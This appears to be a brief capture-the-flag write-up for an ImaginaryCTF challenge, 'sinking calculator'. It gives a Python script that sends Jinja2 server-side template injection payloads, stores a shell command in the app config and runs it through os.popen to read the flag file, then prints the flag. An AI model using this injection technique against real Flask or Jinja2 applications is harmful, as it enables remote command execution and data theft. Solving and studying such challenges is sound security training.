# sinking calculator

reading through this link https://unix.stackexchange.com/questions/92447/bash-script-to-get-ascii-values-for-alphabet

```py
import requests, base64

url = "https://sinking-calculator.chal.imaginaryctf.org/calc"
# url = "http://127.0.0.1:5000/calc"
cmd = "ls"


payload = "config.update(p='cat flag | od -A n -t o1')"
requests.get(url + '?query=' + payload)


payload = "lipsum._globals_.os.popen(config['p']).read()"
res  = requests.get(url + '?query=' + payload)

print("flag in octal :\n%s" % res.text)
```

Flag:- ```ictf{this_flag_has_three_interesting_properties_it_has_no_numbers_or_dashes_it_is_quite_long_and_it_is_quite_scary}```
